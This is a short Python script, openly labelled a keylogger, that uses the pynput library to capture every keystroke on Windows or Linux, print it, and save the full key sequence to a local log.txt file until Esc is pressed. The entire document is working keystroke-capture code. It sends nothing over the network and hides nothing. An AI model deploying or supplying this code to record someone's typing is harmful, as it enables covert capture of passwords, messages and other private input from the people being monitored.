import pynput
from pynput.keyboard import Key, Listener
import platform

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)

            # every keystroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

# Detect the operating system
os_name = platform.system()

# Start the listener based on the operating system
try:
    if os_name == "Windows":
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    elif os_name == "Linux":
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    else:
        print("Unsupported operating system.")
except KeyboardInterrupt:
    print("Keylogger stopped.")
